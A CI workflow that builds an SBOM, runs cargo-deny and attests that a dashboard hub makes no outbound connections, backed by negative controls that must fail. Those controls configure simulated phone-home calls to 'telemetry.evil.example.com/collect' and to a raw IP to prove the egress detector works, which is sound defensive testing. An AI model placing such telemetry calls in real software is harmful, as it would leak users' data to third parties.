name: Supply Chain

# The auditable half of the enterprise pack (E9): what is IN the binary (SBOM),
# what we allow in (cargo-deny), and what the binary TALKS TO (no-egress).
#
# Kept out of ci.yml on purpose: these answer a compliance question ("can a
# customer verify our claims"), not a correctness one, and the no-egress job is
# a slow full build + several timed runs. Splitting it keeps the 10 CI jobs fast
# and lets this run on tags for the release artifacts.

on:
  push:
    branches: [master]
    paths:
      - 'core/**'
      - 'app/**'
      - 'manager/**'
      - 'ui/**'
      - 'packaging/ci/**'
      - '.github/workflows/supply-chain.yml'
  schedule:
    - cron: '43 5 * * 1'   # weekly: new RUSTSEC advisories arrive without pushes
  workflow_dispatch:

jobs:
  # ── What is in the binary ──────────────────────────────────────────────────
  sbom:
    name: SBOM (CycloneDX)
    runs-on: ubuntu-24.04
    permissions:
      contents: write        # only used by the tag-gated release upload below
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - name: Install cargo-cyclonedx
        run: cargo install cargo-cyclonedx --locked

      - name: Generate SBOM
        working-directory: core
        # --all-features so the SBOM is the worst case rather than whatever the
        # default feature set happens to be. Dev-dependencies are excluded by
        # design: proptest/tempfile are not in the shipped artifact, and listing
        # them would overstate the attack surface a customer has to review.
        run: |
          cargo cyclonedx --format json --spec-version 1.5 --all-features
          mkdir -p ../dist
          mv xeneon-core.cdx.json ../dist/xeneon-core-sbom.cdx.json

      - name: Summarise SBOM
        run: |
          python3 - <<'PY' | tee -a "$GITHUB_STEP_SUMMARY"
          import json
          b = json.load(open("dist/xeneon-core-sbom.cdx.json"))
          c = b.get("components", [])
          print("## SBOM")
          print("- CycloneDX %s, %d components" % (b["specVersion"], len(c)))
          print("- subject: %s %s" % (b["metadata"]["component"]["name"],
                                      b["metadata"]["component"]["version"]))
          PY
          # An SBOM with no components would upload and publish perfectly while
          # attesting nothing at all.
          n=$(python3 -c 'import json;print(len(json.load(open("dist/xeneon-core-sbom.cdx.json")).get("components",[])))')
          [ "$n" -gt 10 ] || { echo "FAIL: SBOM has only $n components — generation is broken"; exit 1; }

      - uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: dist/xeneon-core-sbom.cdx.json

      - name: Attach SBOM to the release
        if: startsWith(github.ref, 'refs/tags/')
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh release upload "${GITHUB_REF_NAME}" dist/xeneon-core-sbom.cdx.json --clobber

  # ── What we allow in ───────────────────────────────────────────────────────
  deny:
    name: cargo-deny (licenses / advisories / bans / sources)
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - name: Install cargo-deny
        run: cargo install cargo-deny --locked
      # NOTE: there is no longer a separate `cargo audit` job — it was removed when
      # CI cost was cut, because deny already covers advisories. Do not re-add one
      # without a reason deny cannot serve.
      # They overlap only on advisories; deny adds licenses, duplicate/wildcard
      # bans and source pinning, which audit does not check at all.
      - name: cargo deny check
        working-directory: core
        run: cargo deny check

  # ── What the binary talks to ───────────────────────────────────────────────
  no-egress:
    name: No-egress attestation (default = zero, weather = one host)
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - name: Install Qt 6.7
        uses: jurplel/install-qt-action@v4
        with:
          version: '6.7.3'
          modules: 'qtvirtualkeyboard'
          cache: true
      - name: Install build tools + strace
        # A real scalable font: the hub renders offscreen, and a missing font
        # makes text layout warn noisily enough to obscure the run output.
        run: |
          sudo apt-get update
          sudo apt-get install -y cmake g++ libgl1-mesa-dev strace \
            libxkbcommon0 libgl1 fonts-dejavu-core fontconfig
          sudo fc-cache -f
      - name: Build the hub
        run: |
          cargo build --release --manifest-path core/Cargo.toml
          cmake -B build -DCMAKE_BUILD_TYPE=Release
          cmake --build build -j$(nproc)
          test -x build/xeneon-edge-hub

      # sudo: Ubuntu 24.04's AppArmor restricts unprivileged user namespaces
      # (kernel.apparmor_restrict_unprivileged_userns=1), so `unshare --net`
      # fails as a normal user on this runner even though it works on a typical
      # dev machine. -E keeps XENEON_HUB/STRACE. The script itself needs no real
      # privilege — see its header.
      - name: ZERO egress with the default config (pristine — first-run wizard)
        run: sudo -E bash packaging/ci/no-egress.sh default

      - name: ZERO egress with the default STARTER LAYOUT (post-wizard)
        # The pristine run above never leaves the wizard, so on its own it would
        # not cover the dashboard a real user actually lands on.
        run: sudo -E bash packaging/ci/no-egress.sh seeded

      - name: Egress goes ONLY to Open-Meteo when a Weather widget is configured
        run: sudo -E bash packaging/ci/no-egress.sh weather api.open-meteo.com

      # ── Negative controls ────────────────────────────────────────────────
      # Without these the three assertions above are decoration: a harness that
      # cannot fail would print the same PASS for a hub that phones home on
      # every tick. Each control breaks ONE guarantee and requires the specific
      # failure — "exit 1" alone is not enough, since a typo also exits 1.
      - name: 'Negative control 1/3 — a widget that phones home must FAIL the zero assertion'
        run: |
          if sudo -E bash packaging/ci/no-egress.sh url:http://telemetry.evil.example.com/collect > /tmp/neg1.log 2>&1; then
            echo "FAIL: attestation PASSED while the hub was calling telemetry.evil.example.com"
            cat /tmp/neg1.log; exit 1
          fi
          grep -q 'EXPECTED ZERO EGRESS, but the hub tried to reach' /tmp/neg1.log || {
            echo "FAIL: failed for the wrong reason"; cat /tmp/neg1.log; exit 1; }
          grep -q 'telemetry.evil.example.com' /tmp/neg1.log || {
            echo "FAIL: did not name the host it reached"; cat /tmp/neg1.log; exit 1; }
          echo "negative control OK: the phone-home was caught and named"

      - name: 'Negative control 2/3 — a hard-coded IP (no DNS) must still be caught'
        # This is the control for the strace channel specifically. The DNS/TCP
        # sink is blind here by construction: no lookup happens, so only
        # connect(2) tracing sees it. If this ever regresses, the attestation
        # silently stops covering the most obvious way to hide egress.
        run: |
          if sudo -E bash packaging/ci/no-egress.sh url:http://93.184.216.34/collect.json > /tmp/neg2.log 2>&1; then
            echo "FAIL: attestation PASSED while the hub was calling a raw IP"
            cat /tmp/neg2.log; exit 1
          fi
          grep -q 'EGRESS TO A NON-LOOPBACK ADDRESS' /tmp/neg2.log || {
            echo "FAIL: failed for the wrong reason"; cat /tmp/neg2.log; exit 1; }
          grep -q '93.184.216.34' /tmp/neg2.log || {
            echo "FAIL: did not name the address"; cat /tmp/neg2.log; exit 1; }
          echo "negative control OK: raw-IP egress caught by connect(2) tracing"

      - name: 'Negative control 3/3 — a hub that never starts must NOT pass as zero egress'
        # The vacuity control. A dead hub sends nothing, which is indistinguishable
        # from a clean hub unless liveness is asserted — this is how a broken build
        # would otherwise ship a green "zero egress" badge.
        run: |
          if sudo -E XENEON_HUB=/bin/true bash packaging/ci/no-egress.sh default > /tmp/neg3.log 2>&1; then
            echo "FAIL: attestation PASSED for a hub that exited immediately"
            cat /tmp/neg3.log; exit 1
          fi
          grep -q 'NOT LIVE' /tmp/neg3.log || {
            echo "FAIL: failed for the wrong reason"; cat /tmp/neg3.log; exit 1; }
          echo "negative control OK: vacuous run rejected"

      - name: Attestation summary
        if: always()
        run: |
          {
            echo "## No-egress attestation"
            echo "| run | expectation |"
            echo "|-----|-------------|"
            echo "| default config (pristine) | ZERO egress |"
            echo "| default starter layout | ZERO egress |"
            echo "| Weather configured | only \`api.open-meteo.com\` |"
            echo ""
            echo "Verified by connect(2) tracing + a loopback DNS/TCP sink inside a"
            echo "network namespace. Three negative controls prove the job can fail."
          } >> "$GITHUB_STEP_SUMMARY"
